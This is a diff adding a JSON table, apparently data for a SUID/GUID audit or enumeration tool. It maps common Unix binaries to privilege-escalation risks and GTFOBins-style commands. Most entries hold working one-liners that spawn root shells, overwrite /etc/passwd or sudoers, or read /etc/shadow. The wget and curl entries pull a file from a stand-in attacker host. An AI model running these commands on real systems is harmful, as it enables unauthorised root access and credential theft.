@@ -1,0 +1,408 @@
+{
+  "find": {
+    "suid": {
+      "exploitable": true,
+      "risk": "Can spawn a root shell directly using -exec flag",
+      "command": "find . -exec /bin/sh -p \\; -quit",
+      "reference": "https://gtfobins.github.io/gtfobins/find/"
+    },
+    "guid": {
+      "exploitable": true,
+      "risk": "Can be abused to read/write files with group privileges",
+      "command": "find . -exec /bin/sh -p \\; -quit",
+      "reference": "https://gtfobins.github.io/gtfobins/find/"
+    }
+  },
+  "python3": {
+    "suid": {
+      "exploitable": true,
+      "risk": "Can execute arbitrary code and spawn a root shell",
+      "command": "python3 -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'",
+      "reference": "https://gtfobins.github.io/gtfobins/python/"
+    },
+    "guid": {
+      "exploitable": true,
+      "risk": "Can execute code with group owner privileges",
+      "command": "python3 -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'",
+      "reference": "https://gtfobins.github.io/gtfobins/python/"
+    }
+  },
+  "python": {
+    "suid": {
+      "exploitable": true,
+      "risk": "Can execute arbitrary code and spawn a root shell",
+      "command": "python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'",
+      "reference": "https://gtfobins.github.io/gtfobins/python/"
+    },
+    "guid": {
+      "exploitable": true,
+      "risk": "Can execute code with group owner privileges",
+      "command": "python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'",
+      "reference": "https://gtfobins.github.io/gtfobins/python/"
+    }
+  },
+  "bash": {
+    "suid": {
+      "exploitable": true,
+      "risk": "Directly spawns a privileged shell",
+      "command": "bash -p",
+      "reference": "https://gtfobins.github.io/gtfobins/bash/"
+    },
+    "guid": {
+      "exploitable": true,
+      "risk": "Spawns shell with group owner privileges",
+      "command": "bash -p",
+      "reference": "https://gtfobins.github.io/gtfobins/bash/"
+    }
+  },
+  "sh": {
+    "suid": {
+      "exploitable": true,
+      "risk": "Directly spawns a privileged shell",
+      "command": "sh -p",
+      "reference": "https://gtfobins.github.io/gtfobins/sh/"
+    },
+    "guid": {
+      "exploitable": true,
+      "risk": "Spawns shell with group owner privileges",
+      "command": "sh -p",
+      "reference": "https://gtfobins.github.io/gtfobins/sh/"
+    }
+  },
+  "vim": {
+    "suid": {
+      "exploitable": true,
+      "risk": "Can spawn a shell from within vim editor",
+      "command": "vim -c ':!/bin/sh'",
+      "reference": "https://gtfobins.github.io/gtfobins/vim/"
+    },
+    "guid": {
+      "exploitable": true,
+      "risk": "Can read/write files with group privileges via vim",
+      "command": "vim -c ':!/bin/sh'",
+      "reference": "https://gtfobins.github.io/gtfobins/vim/"
+    }
+  },
+  "nmap": {
+    "suid": {
+      "exploitable": true,
+      "risk": "Older versions allow interactive mode to spawn a shell",
+      "command": "nmap --interactive then type !sh",
+      "reference": "https://gtfobins.github.io/gtfobins/nmap/"
+    },
+    "guid": {
+      "exploitable": false,
+      "risk": null,
+      "command": null,
+      "reference": null
+    }
+  },
+  "perl": {
+    "suid": {
+      "exploitable": true,
+      "risk": "Can execute system commands and spawn a root shell",
+      "command": "perl -e 'exec \"/bin/sh\";'",
+      "reference": "https://gtfobins.github.io/gtfobins/perl/"
+    },
+    "guid": {
+      "exploitable": true,
+      "risk": "Can execute commands with group privileges",
+      "command": "perl -e 'exec \"/bin/sh\";'",
+      "reference": "https://gtfobins.github.io/gtfobins/perl/"
+    }
+  },
+  "ruby": {
+    "suid": {
+      "exploitable": true,
+      "risk": "Can spawn shell via exec call",
+      "command": "ruby -e 'exec \"/bin/sh\"'",
+      "reference": "https://gtfobins.github.io/gtfobins/ruby/"
+    },
+    "guid": {
+      "exploitable": true,
+      "risk": "Can execute commands with group privileges",
+      "command": "ruby -e 'exec \"/bin/sh\"'",
+      "reference": "https://gtfobins.github.io/gtfobins/ruby/"
+    }
+  },
+  "awk": {
+    "suid": {
+      "exploitable": true,
+      "risk": "Can spawn shell using system() call",
+      "command": "awk 'BEGIN {system(\"/bin/sh\")}'",
+      "reference": "https://gtfobins.github.io/gtfobins/awk/"
+    },
+    "guid": {
+      "exploitable": true,
+      "risk": "Can execute commands with group privileges",
+      "command": "awk 'BEGIN {system(\"/bin/sh\")}'",
+      "reference": "https://gtfobins.github.io/gtfobins/awk/"
+    }
+  },
+  "less": {
+    "suid": {
+      "exploitable": true,
+      "risk": "Can spawn shell from within pager using !sh",
+      "command": "less /etc/passwd then type !/bin/sh",
+      "reference": "https://gtfobins.github.io/gtfobins/less/"
+    },
+    "guid": {
+      "exploitable": false,
+      "risk": null,
+      "command": null,
+      "reference": null
+    }
+  },
+  "more": {
+    "suid": {
+      "exploitable": true,
+      "risk": "Can spawn shell from within pager",
+      "command": "more /etc/passwd then type !/bin/sh",
+      "reference": "https://gtfobins.github.io/gtfobins/more/"
+    },
+    "guid": {
+      "exploitable": false,
+      "risk": null,
+      "command": null,
+      "reference": null
+    }
+  },
+  "tar": {
+    "suid": {
+      "exploitable": true,
+      "risk": "Can spawn shell using checkpoint action flag",
+      "command": "tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
+      "reference": "https://gtfobins.github.io/gtfobins/tar/"
+    },
+    "guid": {
+      "exploitable": false,
+      "risk": null,
+      "command": null,
+      "reference": null
+    }
+  },
+  "cp": {
+    "suid": {
+      "exploitable": true,
+      "risk": "Can overwrite /etc/passwd or copy SSH keys",
+      "command": "echo 'root::0:0:root:/root:/bin/bash' | cp /dev/stdin /etc/passwd",
+      "reference": "https://gtfobins.github.io/gtfobins/cp/"
+    },
+    "guid": {
+      "exploitable": false,
+      "risk": null,
+      "command": null,
+      "reference": null
+    }
+  },
+  "tee": {
+    "suid": {
+      "exploitable": true,
+      "risk": "Can overwrite any file including /etc/passwd or sudoers",
+      "command": "echo 'user ALL=(ALL) NOPASSWD:ALL' | tee /etc/sudoers",
+      "reference": "https://gtfobins.github.io/gtfobins/tee/"
+    },
+    "guid": {
+      "exploitable": false,
+      "risk": null,
+      "command": null,
+      "reference": null
+    }
+  },
+  "wget": {
+    "suid": {
+      "exploitable": true,
+      "risk": "Can overwrite files by downloading to sensitive paths",
+      "command": "wget http://attacker.com/passwd -O /etc/passwd",
+      "reference": "https://gtfobins.github.io/gtfobins/wget/"
+    },
+    "guid": {
+      "exploitable": false,
+      "risk": null,
+      "command": null,
+      "reference": null
+    }
+  },
+  "curl": {
+    "suid": {
+      "exploitable": true,
+      "risk": "Can overwrite files or exfiltrate data as root",
+      "command": "curl http://attacker.com/passwd -o /etc/passwd",
+      "reference": "https://gtfobins.github.io/gtfobins/curl/"
+    },
+    "guid": {
+      "exploitable": false,
+      "risk": null,
+      "command": null,
+      "reference": null
+    }
+  },
+  "php": {
+    "suid": {
+      "exploitable": true,
+      "risk": "Can execute system commands and spawn shell",
+      "command": "php -r 'pcntl_exec(\"/bin/sh\", [\"-p\"]);'",
+      "reference": "https://gtfobins.github.io/gtfobins/php/"
+    },
+    "guid": {
+      "exploitable": false,
+      "risk": null,
+      "command": null,
+      "reference": null
+    }
+  },
+  "node": {
+    "suid": {
+      "exploitable": true,
+      "risk": "Can execute arbitrary JS and spawn root shell",
+      "command": "node -e 'require(\"child_process\").spawn(\"/bin/sh\", [\"-p\"], {stdio: [0,1,2]})'",
+      "reference": "https://gtfobins.github.io/gtfobins/node/"
+    },
+    "guid": {
+      "exploitable": false,
+      "risk": null,
+      "command": null,
+      "reference": null
+    }
+  },
+  "env": {
+    "suid": {
+      "exploitable": true,
+      "risk": "Can run arbitrary commands via env wrapper",
+      "command": "env /bin/sh -p",
+      "reference": "https://gtfobins.github.io/gtfobins/env/"
+    },
+    "guid": {
+      "exploitable": false,
+      "risk": null,
+      "command": null,
+      "reference": null
+    }
+  },
+  "dd": {
+    "suid": {
+      "exploitable": true,
+      "risk": "Can read/write raw disk data or overwrite critical files",
+      "command": "echo 'root::0:0::/root:/bin/sh' | dd of=/etc/passwd",
+      "reference": "https://gtfobins.github.io/gtfobins/dd/"
+    },
+    "guid": {
+      "exploitable": false,
+      "risk": null,
+      "command": null,
+      "reference": null
+    }
+  },
+  "cat": {
+    "suid": {
+      "exploitable": true,
+      "risk": "Can read any file including /etc/shadow",
+      "command": "cat /etc/shadow",
+      "reference": "https://gtfobins.github.io/gtfobins/cat/"
+    },
+    "guid": {
+      "exploitable": false,
+      "risk": null,
+      "command": null,
+      "reference": null
+    }
+  },
+  "base64": {
+    "suid": {
+      "exploitable": true,
+      "risk": "Can read any file by encoding it to base64",
+      "command": "base64 /etc/shadow | base64 -d",
+      "reference": "https://gtfobins.github.io/gtfobins/base64/"
+    },
+    "guid": {
+      "exploitable": false,
+      "risk": null,
+      "command": null,
+      "reference": null
+    }
+  },
+  "ping": {
+    "suid": {
+      "exploitable": false,
+      "risk": "SUID is expected and required for raw socket access",
+      "command": null,
+      "reference": null
+    },
+    "guid": {
+      "exploitable": false,
+      "risk": null,
+      "command": null,
+      "reference": null
+    }
+  },
+  "su": {
+    "suid": {
+      "exploitable": false,
+      "risk": "SUID is expected and required for user switching",
+      "command": null,
+      "reference": null
+    },
+    "guid": {
+      "exploitable": false,
+      "risk": null,
+      "command": null,
+      "reference": null
+    }
+  },
+  "passwd": {
+    "suid": {
+      "exploitable": false,
+      "risk": "SUID is expected for password changes",
+      "command": null,
+      "reference": null
+    },
+    "guid": {
+      "exploitable": false,
+      "risk": null,
+      "command": null,
+      "reference": null
+    }
+  },
+  "sudo": {
+    "suid": {
+      "exploitable": false,
+      "risk": "SUID is expected and required for sudo functionality",
+      "command": null,
+      "reference": null
+    },
+    "guid": {
+      "exploitable": false,
+      "risk": null,
+      "command": null,
+      "reference": null
+    }
+  },
+  "mount": {
+    "suid": {
+      "exploitable": true,
+      "risk": "Can mount filesystems and access sensitive data",
+      "command": "mount /dev/sda1 /mnt then access sensitive files",
+      "reference": "https://gtfobins.github.io/gtfobins/mount/"
+    },
+    "guid": {
+      "exploitable": false,
+      "risk": null,
+      "command": null,
+      "reference": null
+    }
+  },
+  "lua": {
+    "suid": {
+      "exploitable": true,
+      "risk": "Can execute OS commands via os.execute()",
+      "command": "lua -e 'os.execute(\"/bin/sh\")'",
+      "reference": "https://gtfobins.github.io/gtfobins/lua/"
+    },
+    "guid": {
+      "exploitable": false,
+      "risk": null,
+      "command": null,
+      "reference": null
+    }
+  }
+}
